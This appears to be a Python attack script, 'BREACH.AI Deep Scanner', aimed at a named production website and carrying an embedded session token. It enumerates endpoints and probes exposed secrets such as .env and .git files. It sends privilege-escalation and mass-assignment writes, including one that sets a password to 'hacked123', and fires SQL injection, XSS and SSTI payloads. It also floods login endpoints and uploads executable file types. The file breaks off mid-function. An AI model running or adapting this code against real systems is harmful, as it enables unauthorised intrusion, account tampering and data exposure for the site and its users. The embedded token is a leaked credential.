#!/usr/bin/env python3
"""
BREACH.AI - DEEP SCANNER
========================
Maximum depth, maximum coverage, maximum findings.
"""

import asyncio
import aiohttp
import json
import re
import time
import hashlib
from dataclasses import dataclass, field
from typing import Dict, List, Set, Optional, Any, Tuple
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box

console = Console()

# Session token from user
SESSION_TOKEN = "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..jlIxhGVcxuPHbJzw.QE34H3xswQ5tkvUm2MhD6glQOKwNYPByp4xKhHYzPuJRddzml2ZS78ICvNNrfJcI0G2FdYPjSIkEn2BOqKfTQMU6He0P_Nl80LQ4UaB7EBbIiHak4vzSkGMUxPuXuDgFlYOOUGMmZSw8kSzXJT-eWDJPbgD4jT-9_SgSMydR1yAYhXk-esS53ycmxLzS6Ic_HYBGQFJGUauVPdHeTX3rlmqQkBj2wKpu8qfPNYU2taVyjhlJD18lFjlpPZB8X0t1BSigjkLVk0YhFh_Tve8DWFGe-eK2sJrNzM0IY3sPz2qkMPZzqm8hlXXLFa-xX-aTsdXjHLfqwCiSqZIl8t79hwWJWsBn8BNu1RblosMW5_Pg0oITTsv_jmO5FhZiQl8cIu1KSrUj0IHi5DWp_EaT50c.F-pVCN1iNzxVl1JpZLwBQA"
TARGET = "https://www.rapidnative.com"

@dataclass
class DeepFinding:
    severity: str
    category: str
    title: str
    description: str
    endpoint: str
    method: str = "GET"
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    impact: int = 0
    curl: str = ""
    fix: str = ""

class DeepScanner:
    def __init__(self, target: str, session_token: str):
        self.target = target
        self.session_token = session_token
        self.session: Optional[aiohttp.ClientSession] = None
        self.findings: List[DeepFinding] = []
        self.discovered_endpoints: Set[str] = set()
        self.discovered_params: Dict[str, List[str]] = {}
        self.discovered_ids: Set[str] = set()
        self.api_responses: Dict[str, dict] = {}
        self.request_count = 0

    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={'User-Agent': 'Mozilla/5.0 BREACH.AI/DeepScan'}
        )
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    def cookies(self) -> dict:
        return {"__session": self.session_token}

    async def req(self, method: str, url: str, **kwargs) -> Tuple[int, str, dict]:
        """Make authenticated request."""
        self.request_count += 1
        if not url.startswith('http'):
            url = urljoin(self.target, url)

        cookies = kwargs.pop('cookies', self.cookies())

        try:
            async with self.session.request(
                method, url, cookies=cookies, ssl=False, **kwargs
            ) as resp:
                body = await resp.text()
                return resp.status, body, dict(resp.headers)
        except Exception as e:
            return 0, str(e), {}

    async def get(self, url: str, **kwargs) -> Tuple[int, str, dict]:
        return await self.req("GET", url, **kwargs)

    async def post(self, url: str, **kwargs) -> Tuple[int, str, dict]:
        return await self.req("POST", url, **kwargs)

    async def put(self, url: str, **kwargs) -> Tuple[int, str, dict]:
        return await self.req("PUT", url, **kwargs)

    async def delete(self, url: str, **kwargs) -> Tuple[int, str, dict]:
        return await self.req("DELETE", url, **kwargs)

    async def patch(self, url: str, **kwargs) -> Tuple[int, str, dict]:
        return await self.req("PATCH", url, **kwargs)

    def add_finding(self, **kwargs):
        f = DeepFinding(**kwargs)
        self.findings.append(f)
        color = {"CRITICAL": "red bold", "HIGH": "yellow", "MEDIUM": "blue"}.get(f.severity, "dim")
        console.print(f"  [{color}][{f.severity}] {f.title}[/{color}]")
        console.print(f"     {f.endpoint}")
        if f.parameter:
            console.print(f"     Param: {f.parameter}")
        if f.evidence:
            console.print(f"     Evidence: {f.evidence[:100]}...")

    async def run(self):
        """Run comprehensive deep scan."""
        self._banner()

        # Phase 1: Deep Crawl & Discovery
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 1: DEEP CRAWL & ENDPOINT DISCOVERY[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._deep_crawl()

        # Phase 2: API Endpoint Enumeration
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 2: API ENUMERATION[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._enumerate_api()

        # Phase 3: Authentication & Session Testing
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 3: AUTH & SESSION ANALYSIS[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._test_auth()

        # Phase 4: IDOR & Access Control
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 4: IDOR & ACCESS CONTROL[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._test_idor()

        # Phase 5: Business Logic Testing
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 5: BUSINESS LOGIC[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._test_business_logic()

        # Phase 6: Mass Assignment
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 6: MASS ASSIGNMENT[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._test_mass_assignment()

        # Phase 7: Injection Testing
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 7: INJECTION ATTACKS[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._test_injections()

        # Phase 8: Rate Limiting & Brute Force
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 8: RATE LIMITING[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._test_rate_limiting()

        # Phase 9: Information Disclosure
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 9: INFORMATION DISCLOSURE[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._test_info_disclosure()

        # Phase 10: Security Headers & Config
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 10: SECURITY HEADERS[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._test_headers()

        # Phase 11: File Upload Testing
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 11: FILE UPLOAD[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._test_file_upload()

        # Phase 12: GraphQL Deep Scan
        console.print(f"\n[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold cyan]PHASE 12: GRAPHQL ANALYSIS[/bold cyan]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        await self._test_graphql()

        # Final Report
        self._report()

    def _banner(self):
        console.print(Panel.fit(
            f"[bold red]BREACH.AI - DEEP SCANNER[/bold red]\n"
            f"[dim]Maximum Depth Mode[/dim]\n\n"
            f"Target: {self.target}\n"
            f"Mode: Authenticated Deep Scan",
            border_style="red"
        ))

    async def _deep_crawl(self):
        """Deep crawl to discover all endpoints."""
        console.print(f"\n[yellow]Crawling authenticated pages...[/yellow]")

        # Main pages to crawl
        pages = [
            "/", "/dashboard", "/admin", "/settings", "/projects",
            "/profile", "/account", "/billing", "/team", "/users",
            "/analytics", "/reports", "/api", "/docs", "/help",
            "/integrations", "/webhooks", "/tokens", "/keys",
        ]

        crawled = set()
        to_crawl = list(pages)

        while to_crawl and len(crawled) < 50:
            url = to_crawl.pop(0)
            if url in crawled:
                continue
            crawled.add(url)

            status, body, headers = await self.get(url)

            if status == 200:
                self.discovered_endpoints.add(url)
                console.print(f"  [green]+ {url}[/green] ({len(body)}b)")

                # Extract IDs
                uuids = re.findall(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', body, re.I)
                self.discovered_ids.update(uuids[:10])

                numeric_ids = re.findall(r'["\'](?:id|userId|projectId|teamId)["\']:\s*["\']?(\d+)', body)
                self.discovered_ids.update(numeric_ids[:10])

                # Extract links
                links = re.findall(r'href=["\']([^"\']+)["\']', body)
                for link in links:
                    if link.startswith('/') and not link.startswith('//'):
                        if link not in crawled and link not in to_crawl:
                            to_crawl.append(link)

                # Extract API endpoints from JS
                api_endpoints = re.findall(r'["\']/(api/[^"\']+)["\']', body)
                for ep in api_endpoints:
                    self.discovered_endpoints.add(f"/{ep}")

            elif status == 401:
                console.print(f"  [dim]- {url}[/dim] (401 - needs auth)")
            elif status == 403:
                console.print(f"  [yellow]! {url}[/yellow] (403 - forbidden)")
            elif status == 404:
                pass
            else:
                console.print(f"  [dim]? {url}[/dim] ({status})")

        console.print(f"\n[dim]Discovered {len(self.discovered_endpoints)} endpoints, {len(self.discovered_ids)} IDs[/dim]")

    async def _enumerate_api(self):
        """Enumerate API endpoints thoroughly."""
        console.print(f"\n[yellow]Probing API endpoints...[/yellow]")

        api_paths = [
            # Standard CRUD
            "/api/users", "/api/user", "/api/me",
            "/api/projects", "/api/project",
            "/api/teams", "/api/team",
            "/api/organizations", "/api/organization", "/api/org",
            "/api/accounts", "/api/account",
            "/api/settings", "/api/preferences",
            "/api/billing", "/api/subscription", "/api/plan",
            "/api/invoices", "/api/payments",
            "/api/tokens", "/api/keys", "/api/apikeys",
            "/api/webhooks", "/api/hooks",
            "/api/integrations",
            "/api/notifications",
            "/api/messages", "/api/inbox",
            "/api/files", "/api/uploads", "/api/documents",
            "/api/analytics", "/api/stats", "/api/metrics",
            "/api/reports", "/api/exports",
            "/api/logs", "/api/audit", "/api/activity",
            "/api/search", "/api/query",
            "/api/config", "/api/configuration",
            "/api/health", "/api/status", "/api/ping",
            "/api/version", "/api/info",
            "/api/admin", "/api/admin/users", "/api/admin/settings",

            # v1/v2/v3 variants
            "/api/v1/users", "/api/v2/users", "/api/v3/users",
            "/api/v1/projects", "/api/v2/projects",

            # GraphQL
            "/graphql", "/api/graphql", "/graphiql",

            # Clerk-specific (they use Clerk)
            "/api/clerk", "/api/auth/session", "/api/auth/user",

            # Common SaaS
            "/api/workspace", "/api/workspaces",
            "/api/members", "/api/invites",
            "/api/roles", "/api/permissions",
        ]

        found_apis = []

        for path in api_paths:
            status, body, headers = await self.get(path)

            if status == 200:
                found_apis.append(path)
                console.print(f"  [green]+ {path}[/green] ({len(body)}b)")

                # Try to parse as JSON
                try:
                    data = json.loads(body)
                    self.api_responses[path] = data

                    # Extract more IDs
                    body_str = json.dumps(data)
                    uuids = re.findall(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', body_str, re.I)
                    self.discovered_ids.update(uuids[:10])

                    # Show sample data keys
                    if isinstance(data, dict):
                        keys = list(data.keys())[:5]
                        console.print(f"       Keys: {keys}")
                    elif isinstance(data, list) and data:
                        if isinstance(data[0], dict):
                            keys = list(data[0].keys())[:5]
                            console.print(f"       Keys: {keys} ({len(data)} items)")
                except:
                    pass

            elif status == 401:
                console.print(f"  [yellow]! {path}[/yellow] (401 - auth required)")
            elif status == 403:
                console.print(f"  [red]X {path}[/red] (403 - forbidden)")
            elif status == 405:
                console.print(f"  [dim]~ {path}[/dim] (405 - method not allowed)")
                found_apis.append(path)  # Still exists, try other methods

        console.print(f"\n[dim]Found {len(found_apis)} API endpoints[/dim]")

        # Test different HTTP methods on found endpoints
        console.print(f"\n[yellow]Testing HTTP methods...[/yellow]")
        for api in found_apis[:10]:
            for method in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS"]:
                status, body, headers = await self.req(method, api)
                if status not in [404, 405, 0]:
                    console.print(f"  [green]+ {method} {api}[/green] -> {status}")
                    if method == "OPTIONS" and "Access-Control-Allow-Methods" in headers:
                        console.print(f"       Allowed: {headers.get('Access-Control-Allow-Methods')}")

    async def _test_auth(self):
        """Test authentication and session handling."""
        console.print(f"\n[yellow]Testing session security...[/yellow]")

        # Test 1: Session without cookie
        console.print(f"\n  [dim]1. Testing endpoints without session...[/dim]")
        protected = ["/api/me", "/api/user", "/api/projects", "/dashboard", "/settings"]

        for endpoint in protected:
            status, body, _ = await self.req("GET", endpoint, cookies={})
            if status == 200 and len(body) > 100:
                self.add_finding(
                    severity="CRITICAL",
                    category="auth_bypass",
                    title=f"Auth Bypass - {endpoint}",
                    description="Endpoint accessible without authentication",
                    endpoint=endpoint,
                    impact=50000,
                    curl=f"curl '{self.target}{endpoint}'"
                )
            else:
                console.print(f"     {endpoint} -> {status} (protected)")

        # Test 2: Session fixation
        console.print(f"\n  [dim]2. Testing session fixation...[/dim]")
        fake_session = "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..AAAAAAAAAAAAAAAA.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.AAAAAAAAAAAAAAAAAAAAAA"
        status, body, _ = await self.req("GET", "/api/me", cookies={"__session": fake_session})
        if status == 200:
            self.add_finding(
                severity="CRITICAL",
                category="session_fixation",
                title="Session Fixation Possible",
                description="Server accepts arbitrary session tokens",
                endpoint="/api/me",
                impact=75000
            )
        else:
            console.print(f"     Fake session rejected ({status})")

        # Test 3: Session in URL
        console.print(f"\n  [dim]3. Testing session in URL parameter...[/dim]")
        status, body, _ = await self.req("GET", f"/api/me?session={self.session_token}", cookies={})
        if status == 200 and len(body) > 100:
            self.add_finding(
                severity="HIGH",
                category="session_exposure",
                title="Session Token Accepted in URL",
                description="Session can be passed via URL parameter (leaks in logs/referrer)",
                endpoint="/api/me",
                impact=25000
            )

        # Test 4: Cookie attributes
        console.print(f"\n  [dim]4. Checking session cookie attributes...[/dim]")
        status, body, headers = await self.get("/")
        set_cookie = headers.get('set-cookie', headers.get('Set-Cookie', ''))
        if set_cookie:
            issues = []
            if 'HttpOnly' not in set_cookie:
                issues.append("Missing HttpOnly")
            if 'Secure' not in set_cookie:
                issues.append("Missing Secure")
            if 'SameSite' not in set_cookie:
                issues.append("Missing SameSite")

            if issues:
                self.add_finding(
                    severity="MEDIUM",
                    category="cookie_security",
                    title="Insecure Cookie Configuration",
                    description=f"Cookie issues: {', '.join(issues)}",
                    endpoint="/",
                    evidence=set_cookie[:100],
                    impact=10000
                )
            else:
                console.print(f"     Cookie attributes OK")

    async def _test_idor(self):
        """Test for IDOR vulnerabilities."""
        console.print(f"\n[yellow]Testing IDOR with discovered IDs...[/yellow]")

        if not self.discovered_ids:
            console.print(f"  [dim]No IDs discovered for IDOR testing[/dim]")
            return

        console.print(f"  [dim]Testing {len(self.discovered_ids)} IDs[/dim]")

        # Patterns to test
        id_endpoints = [
            "/api/users/{id}",
            "/api/user/{id}",
            "/api/projects/{id}",
            "/api/project/{id}",
            "/api/documents/{id}",
            "/api/files/{id}",
            "/api/teams/{id}",
            "/api/organizations/{id}",
            "/api/invoices/{id}",
            "/api/payments/{id}",
            "/api/orders/{id}",
            "/projects/{id}",
            "/user/{id}",
            "/profile/{id}",
        ]

        # First get our own data to compare
        status, my_data, _ = await self.get("/api/me")
        my_id = None
        try:
            data = json.loads(my_data)
            my_id = data.get('id') or data.get('userId') or data.get('user', {}).get('id')
        except:
            pass

        for endpoint_pattern in id_endpoints:
            for test_id in list(self.discovered_ids)[:5]:
                # Skip our own ID
                if test_id == my_id:
                    continue

                endpoint = endpoint_pattern.replace("{id}", str(test_id))

                status, body, _ = await self.get(endpoint)

                if status == 200 and len(body) > 50:
                    try:
                        data = json.loads(body)
                        # Check if we got another user's data
                        if isinstance(data, dict):
                            # Look for PII indicators
                            pii_keys = ['email', 'phone', 'address', 'name', 'password']
                            found_pii = [k for k in data.keys() if any(p in k.lower() for p in pii_keys)]

                            if found_pii or len(body) > 200:
                                self.add_finding(
                                    severity="CRITICAL" if found_pii else "HIGH",
                                    category="idor",
                                    title=f"IDOR - {endpoint_pattern}",
                                    description=f"Accessed resource with ID: {test_id}",
                                    endpoint=endpoint,
                                    evidence=f"PII fields: {found_pii}" if found_pii else f"Data: {body[:100]}",
                                    impact=50000 if found_pii else 25000,
                                    curl=f"curl '{self.target}{endpoint}' -H 'Cookie: __session=...'"
                                )
                                break
                    except:
                        pass
                elif status == 403:
                    console.print(f"  [green]+ {endpoint}[/green] - Access denied (good)")
                elif status == 404:
                    pass

        # Test numeric ID increment
        console.print(f"\n  [dim]Testing numeric ID enumeration...[/dim]")
        for base in ["/api/users/", "/api/projects/", "/api/documents/"]:
            for i in range(1, 10):
                status, body, _ = await self.get(f"{base}{i}")
                if status == 200 and len(body) > 50:
                    console.print(f"  [red]! {base}{i}[/red] -> {status} (potential IDOR)")

    async def _test_business_logic(self):
        """Test business logic vulnerabilities."""
        console.print(f"\n[yellow]Testing business logic...[/yellow]")

        # Test 1: Negative values
        console.print(f"\n  [dim]1. Testing negative values...[/dim]")
        endpoints = ["/api/billing/credits", "/api/subscription/quantity", "/api/order"]
        for ep in endpoints:
            status, _, _ = await self.post(ep, json={"amount": -100})
            if status in [200, 201]:
                console.print(f"  [red]! {ep} accepts negative values[/red]")

        # Test 2: Zero values
        console.print(f"\n  [dim]2. Testing zero/empty values...[/dim]")
        for ep in ["/api/checkout", "/api/payment", "/api/order"]:
            status, body, _ = await self.post(ep, json={"amount": 0, "price": 0})
            if status in [200, 201]:
                console.print(f"  [red]! {ep} accepts zero values[/red]")

        # Test 3: State manipulation
        console.print(f"\n  [dim]3. Testing state manipulation...[/dim]")
        state_payloads = [
            {"status": "admin"},
            {"role": "admin"},
            {"isAdmin": True},
            {"verified": True},
            {"subscription": "enterprise"},
            {"plan": "unlimited"},
        ]

        for payload in state_payloads:
            for ep in ["/api/user", "/api/me", "/api/profile", "/api/settings"]:
                status, body, _ = await self.patch(ep, json=payload)
                if status == 200:
                    try:
                        data = json.loads(body)
                        key = list(payload.keys())[0]
                        if data.get(key) == payload[key]:
                            self.add_finding(
                                severity="CRITICAL",
                                category="privilege_escalation",
                                title=f"Privilege Escalation via {key}",
                                description=f"Can set {key} to {payload[key]}",
                                endpoint=ep,
                                parameter=key,
                                payload=str(payload),
                                impact=100000
                            )
                    except:
                        pass

        # Test 4: Coupon/discount abuse
        console.print(f"\n  [dim]4. Testing discount/coupon abuse...[/dim]")
        for ep in ["/api/coupon", "/api/discount", "/api/promo"]:
            for code in ["ADMIN", "FREE", "100OFF", "INTERNAL", "TEST"]:
                status, body, _ = await self.post(ep, json={"code": code})
                if status == 200:
                    console.print(f"  [yellow]! {ep} accepted code: {code}[/yellow]")

    async def _test_mass_assignment(self):
        """Test for mass assignment vulnerabilities."""
        console.print(f"\n[yellow]Testing mass assignment...[/yellow]")

        # Get current user data first
        status, body, _ = await self.get("/api/me")
        original_data = {}
        try:
            original_data = json.loads(body)
        except:
            return

        # Dangerous fields to try injecting
        dangerous_fields = {
            "role": "admin",
            "isAdmin": True,
            "admin": True,
            "is_admin": True,
            "is_superuser": True,
            "permissions": ["admin", "write", "delete"],
            "subscription_tier": "enterprise",
            "credits": 999999,
            "balance": 999999,
            "verified": True,
            "email_verified": True,
            "password": "hacked123",
            "organization_id": "00000000-0000-0000-0000-000000000000",
            "created_at": "2020-01-01",
        }

        # Try updating with dangerous fields
        for field, value in dangerous_fields.items():
            update_data = {**original_data, field: value}

            for ep in ["/api/me", "/api/user", "/api/profile", "/api/settings"]:
                status, body, _ = await self.put(ep, json=update_data)
                if status == 200:
                    try:
                        new_data = json.loads(body)
                        if new_data.get(field) == value:
                            self.add_finding(
                                severity="CRITICAL",
                                category="mass_assignment",
                                title=f"Mass Assignment - {field}",
                                description=f"Can inject '{field}' field via API",
                                endpoint=ep,
                                parameter=field,
                                payload=str(value),
                                impact=75000,
                                fix="Whitelist allowed fields on server"
                            )
                    except:
                        pass

    async def _test_injections(self):
        """Test for injection vulnerabilities."""
        console.print(f"\n[yellow]Testing injection vectors...[/yellow]")

        # Gather testable endpoints with params
        test_endpoints = []

        # From discovered API responses
        for path, data in self.api_responses.items():
            if isinstance(data, dict):
                params = list(data.keys())[:3]
                test_endpoints.append((path, params))

        # Standard test points
        test_endpoints.extend([
            ("/api/search", ["q", "query", "term"]),
            ("/api/users", ["email", "name", "id"]),
            ("/api/projects", ["name", "id"]),
        ])

        # SQL Injection
        console.print(f"\n  [dim]Testing SQL injection...[/dim]")
        sqli_payloads = ["'", "\"", "' OR '1'='1", "1' ORDER BY 100--", "'; DROP TABLE--"]
        sqli_errors = ["sql", "mysql", "postgres", "syntax error", "query"]

        for endpoint, params in test_endpoints[:5]:
            for param in params[:2]:
                for payload in sqli_payloads:
                    status, body, _ = await self.get(f"{endpoint}?{param}={quote(payload)}")
                    if any(err in body.lower() for err in sqli_errors):
                        self.add_finding(
                            severity="CRITICAL",
                            category="sqli",
                            title=f"SQL Injection - {param}",
                            description="SQL error in response",
                            endpoint=endpoint,
                            parameter=param,
                            payload=payload,
                            evidence=body[:200],
                            impact=100000
                        )
                        break

        # NoSQL Injection
        console.print(f"\n  [dim]Testing NoSQL injection...[/dim]")
        nosql_payloads = ['{"$gt": ""}', '{"$ne": null}', '[$ne]=1']

        for endpoint, params in test_endpoints[:5]:
            for param in params[:2]:
                for payload in nosql_payloads:
                    status, body, _ = await self.get(f"{endpoint}?{param}={quote(payload)}")
                    # Check for data leak (more data than expected)
                    if status == 200 and len(body) > 1000:
                        console.print(f"  [yellow]? {endpoint}?{param}={payload[:20]}[/yellow] -> large response")

        # XSS
        console.print(f"\n  [dim]Testing XSS...[/dim]")
        xss_payloads = ["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>']

        for endpoint, params in test_endpoints[:5]:
            for param in params[:2]:
                for payload in xss_payloads:
                    status, body, _ = await self.get(f"{endpoint}?{param}={quote(payload)}")
                    if payload in body and '&lt;script' not in body:
                        self.add_finding(
                            severity="HIGH",
                            category="xss",
                            title=f"Reflected XSS - {param}",
                            description="XSS payload reflected without encoding",
                            endpoint=endpoint,
                            parameter=param,
                            payload=payload,
                            impact=25000
                        )
                        break

        # SSTI (Server Side Template Injection)
        console.print(f"\n  [dim]Testing SSTI...[/dim]")
        ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]

        for endpoint, params in test_endpoints[:3]:
            for param in params[:2]:
                for payload in ssti_payloads:
                    status, body, _ = await self.get(f"{endpoint}?{param}={quote(payload)}")
                    if "49" in body and "7*7" not in body:
                        self.add_finding(
                            severity="CRITICAL",
                            category="ssti",
                            title=f"SSTI - {param}",
                            description="Server-side template injection",
                            endpoint=endpoint,
                            parameter=param,
                            payload=payload,
                            impact=100000
                        )

    async def _test_rate_limiting(self):
        """Test rate limiting."""
        console.print(f"\n[yellow]Testing rate limiting...[/yellow]")

        # Test login/auth endpoints
        auth_endpoints = [
            "/api/auth/login",
            "/api/login",
            "/api/auth/signin",
            "/api/signin",
        ]

        for endpoint in auth_endpoints:
            statuses = []
            for i in range(20):
                status, _, _ = await self.post(endpoint, json={"email": f"test{i}@test.com", "password": "test"})
                statuses.append(status)
                if status == 429:
                    console.print(f"  [green]+ {endpoint}[/green] - Rate limited after {i+1} requests")
                    break
            else:
                if any(s != 404 for s in statuses):
                    console.print(f"  [red]! {endpoint}[/red] - No rate limiting detected")

        # Test sensitive endpoints
        sensitive = ["/api/password/reset", "/api/forgot-password", "/api/otp", "/api/verify"]
        for endpoint in sensitive:
            statuses = []
            for i in range(10):
                status, _, _ = await self.post(endpoint, json={"email": "test@test.com"})
                statuses.append(status)
                if status == 429:
                    break

            if 429 not in statuses and any(s in [200, 201, 400] for s in statuses):
                self.add_finding(
                    severity="MEDIUM",
                    category="rate_limit",
                    title=f"Missing Rate Limit - {endpoint}",
                    description="No rate limiting on sensitive endpoint",
                    endpoint=endpoint,
                    impact=15000,
                    fix="Implement rate limiting"
                )

    async def _test_info_disclosure(self):
        """Test for information disclosure."""
        console.print(f"\n[yellow]Testing information disclosure...[/yellow]")

        sensitive_paths = [
            "/.env", "/.env.local", "/.env.production", "/.env.development",
            "/.git/config", "/.git/HEAD", "/.git/logs/HEAD",
            "/.svn/entries",
            "/config.json", "/config.yaml", "/settings.json",
            "/package.json", "/composer.json", "/Gemfile",
            "/wp-config.php", "/configuration.php",
            "/web.config", "/.htaccess",
            "/phpinfo.php", "/info.php", "/test.php",
            "/debug", "/api/debug", "/api/config",
            "/server-status", "/server-info",
            "/.well-known/security.txt",
            "/robots.txt", "/sitemap.xml",
            "/api/health", "/api/status", "/api/version",
            "/swagger.json", "/openapi.json", "/api-docs",
            "/graphql", "/graphiql",
            "/actuator", "/actuator/health", "/actuator/env",
            "/trace", "/heapdump", "/metrics",
        ]

        for path in sensitive_paths:
            status, body, headers = await self.get(path)

            if status == 200 and len(body) > 10:
                # Check if it's actually sensitive
                sensitive_patterns = [
                    "password", "secret", "key", "token", "database",
                    "DB_", "AWS_", "STRIPE_", "API_KEY", "PRIVATE",
                    "root:", "[core]", "remote = ", "url = ",
                ]

                is_sensitive = any(p.lower() in body.lower() for p in sensitive_patterns)
                is_config = path.endswith(('.json', '.yaml', '.yml', '.env', '.config'))

                if is_sensitive or is_config:
                    severity = "CRITICAL" if any(p in body for p in ["password", "secret", "PRIVATE"]) else "HIGH"
                    self.add_finding(
                        severity=severity,
                        category="info_disclosure",
                        title=f"Sensitive File Exposed - {path}",
                        description="Sensitive configuration or file accessible",
                        endpoint=path,
                        evidence=body[:200],
                        impact=50000 if severity == "CRITICAL" else 25000,
                        curl=f"curl '{self.target}{path}'"
                    )
                else:
                    console.print(f"  [dim]+ {path}[/dim] ({len(body)}b)")

    async def _test_headers(self):
        """Test security headers."""
        console.print(f"\n[yellow]Checking security headers...[/yellow]")

        status, body, headers = await self.get("/")

        # Normalize header names
        headers_lower = {k.lower(): v for k, v in headers.items()}

        required_headers = {
            "strict-transport-security": "HSTS not set",
            "x-content-type-options": "X-Content-Type-Options not set",
            "x-frame-options": "X-Frame-Options not set (clickjacking)",
            "content-security-policy": "CSP not set",
            "x-xss-protection": "X-XSS-Protection not set",
        }

        missing = []
        for header, issue in required_headers.items():
            if header not in headers_lower:
                missing.append(issue)
                console.print(f"  [yellow]! {issue}[/yellow]")
            else:
                console.print(f"  [green]+ {header}: {headers_lower[header][:50]}[/green]")

        if missing:
            self.add_finding(
                severity="LOW",
                category="headers",
                title="Missing Security Headers",
                description=f"Missing: {', '.join(missing[:3])}",
                endpoint="/",
                impact=5000
            )

        # Check for server info disclosure
        if 'server' in headers_lower:
            server = headers_lower['server']
            if any(x in server.lower() for x in ['apache', 'nginx', 'iis', 'php']):
                console.print(f"  [yellow]! Server header reveals: {server}[/yellow]")

    async def _test_file_upload(self):
        """Test file upload vulnerabilities."""
        console.print(f"\n[yellow]Testing file upload endpoints...[/yellow]")

        upload_endpoints = [
            "/api/upload", "/api/files", "/api/documents",
            "/api/images", "/api/media", "/api/attachments",
            "/upload", "/files/upload",
        ]

        for endpoint in upload_endpoints:
            # Check if endpoint exists
            status, _, _ = await self.post(endpoint)

            if status not in [404, 405]:
                console.print(f"  [dim]Found upload endpoint: {endpoint} ({status})[/dim]")

                # Test dangerous file types
                # Note: We're not actually uploading, just testing if the endpoint accepts them
                dangerous_extensions = [".php", ".jsp", ".aspx", ".exe", ".sh"]

                for ext in dangerous_extensions:
                    # Create minimal test file
                    files = {
                        'file': (f'test{ext}', b'<?php echo "test"; ?>', 'application/octet-stream')
                    }

                    try:
                        form_data = aiohttp.FormData()
                        form_data.add_field('file', b'test content', filename=f'test{ext}')

                        status, body, _ = await self.req(
                            "POST",
                            endpoint,
                            data=form_data
                        )

                        if status in [200, 201]:
                            console.print(f"  [red]! {endpoint} accepts {ext} files[/red]")
                    except:
                        pass

    async def _test_graphql(self):
        """Test GraphQL vulnerabilities."""
        console.print(f"\n[yellow]Testing GraphQL...[/yellow]")

        gql_endpoints = ["/graphql", "/api/graphql", "/graphiql", "/api/graphiql"]
        gql_url = None

        for endpoint in gql_endpoints:
            status, body, _ = await self.post(endpoint, json={"query": "{__typename}"})
            if status == 200 and "data" in body.lower():
                gql_url = endpoint
                console.print(f"  [green]+ GraphQL found at {endpoint}[/green]")
                break

        if not gql_url:
            console.print(f"  [dim]No GraphQL endpoint found[/dim]")
            return

        # Test introspection
        console.print(f"\n  [dim]Testing introspection...[/dim]")
        introspection_query = """
        query {
            __schema {
                types {
                    name
                    fields {
                        name
                        type { name }
                    }
                }
            }
        }
        """

        status, body, _ = await self.post(gql_url, json={"query": introspection_query})

        if status == 200 and "__schema" in body:
            try:
                data = json.loads(body)
                types = data.get('data', {}).get('__schema', {}).get('types', [])
                user_types = [t for t in types if t.get('name') and not t['name'].startswith('__')]

                self.add_finding(
                    severity="HIGH",
                    category="graphql",
                    title="GraphQL Introspection Enabled",
                    description=f"Schema exposed: {len(user_types)} types",
                    endpoint=gql_url,
                    evidence=str([t['name'] for t in user_types[:10]]),
                    impact=15000,
                    fix="Disable introspection in production"
                )

                # Look for sensitive types
                sensitive_types = ['user', 'admin', 'password', 'token', 'secret', 'payment']
                found_sensitive = [t['name'] for t in user_types if any(s in t['name'].lower() for s in sensitive_types)]

                if found_sensitive:
                    console.print(f"  [yellow]Sensitive types: {found_sensitive}[/yellow]")

            except:
                pass
        else:
            console.print(f"  [green]+ Introspection disabled[/green]")

        # Test batch queries (DoS vector)
        console.print(f"\n  [dim]Testing batch queries...[/dim]")
        batch_query = [{"query": "{__typename}"} for _ in range(100)]
        status, body, _ = await self.post(gql_url, json=batch_query)

        if status == 200:
